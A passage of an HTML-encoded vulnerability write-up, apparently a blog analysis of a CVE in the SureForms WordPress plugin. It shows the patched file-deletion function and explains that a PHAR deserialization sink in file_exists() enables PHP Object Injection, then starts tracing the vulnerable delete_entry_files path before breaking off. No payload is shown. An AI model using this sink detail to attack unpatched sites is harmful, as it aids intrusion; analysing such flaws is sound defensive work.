class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;delete_upload_file_from_subdir&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$file_url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;sureforms/&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;static&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;delete_upload_file_from_subdir&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$file_url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$subdir&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;sureforms/&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Decode&amp;ensp;the&amp;ensp;file&amp;ensp;URL.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$file_url&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;urldecode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$file_url&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Check&amp;ensp;if&amp;ensp;the&amp;ensp;file&amp;ensp;URL&amp;ensp;is&amp;ensp;empty.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$file_url&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$file_url&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Normalize&amp;ensp;and&amp;ensp;sanitize&amp;ensp;the&amp;ensp;subdirectory.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$subdir&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;trailingslashit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;sanitize_text_field&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$subdir&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Get&amp;ensp;the&amp;ensp;base&amp;ensp;upload&amp;ensp;directory.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$upload_dir&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_upload_dir&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$base_upload_path&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;trailingslashit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$upload_dir&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;basedir&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$subdir&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Extract&amp;ensp;only&amp;ensp;the&amp;ensp;filename&amp;ensp;from&amp;ensp;URL.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$filename&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;basename&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$file_url&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Construct&amp;ensp;the&amp;ensp;full&amp;ensp;file&amp;ensp;path.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$file_path&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$base_upload_path&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$filename&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Resolve&amp;ensp;real&amp;ensp;paths.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$real_file_path&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;realpath&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$file_path&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$real_base_path&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;realpath&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$base_upload_path&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Security&amp;ensp;check:&amp;ensp;ensure&amp;ensp;file&amp;ensp;is&amp;ensp;inside&amp;ensp;the&amp;ensp;target&amp;ensp;subdir.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$real_file_path&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$real_base_path&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;strpos&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$real_file_path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$real_base_path&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!==&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Delete&amp;ensp;if&amp;ensp;file&amp;ensp;exists.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;file_exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$real_file_path&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;unlink&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$real_file_path&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The new function &lt;code&gt;delete_upload_file_from_subdir()&lt;/code&gt; performs multiple security checks, only allowing deletion of files located in the &lt;code&gt;uploads/sureforms/&lt;/code&gt; directory with valid filenames.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xD;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;According to the description, this CVE is related to a PHP Object Injection vulnerability where the sink is the &lt;code&gt;file_exists()&lt;/code&gt; function, which only occurs in the case of &lt;strong&gt;PHAR Deserialization&lt;/strong&gt;, meaning &lt;code&gt;$file_path&lt;/code&gt; must be in the format &lt;code&gt;phar://phar_file&lt;/code&gt;.&lt;/div&gt;&#xD;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;/div&gt;&#xD;&#xA;  &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;static&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;delete_entry_files&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$entry_id&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$entry_id&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Get&amp;ensp;the&amp;ensp;entry&amp;ensp;data&amp;ensp;to&amp;ensp;get&amp;ensp;the&amp;ensp;file&amp;ensp;URLs.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$form_data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Entries&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_form_data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$entry_id&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$form_data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$form_data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;as&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$field_name&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Continue&amp;ensp;to&amp;ensp;the&amp;ensp;next&amp;ensp;iteration&amp;ensp;if&amp;ensp;the&amp;ensp;field&amp;ensp;name&amp;ensp;does&amp;ensp;not&amp;ensp;contain&amp;ensp;&amp;#39;srfm-upload&amp;#39;&amp;ensp;and&amp;ensp;value&amp;ensp;is&amp;ensp;not&amp;ensp;an&amp;ensp;array.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;strpos&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$field_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;srfm-upload&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span 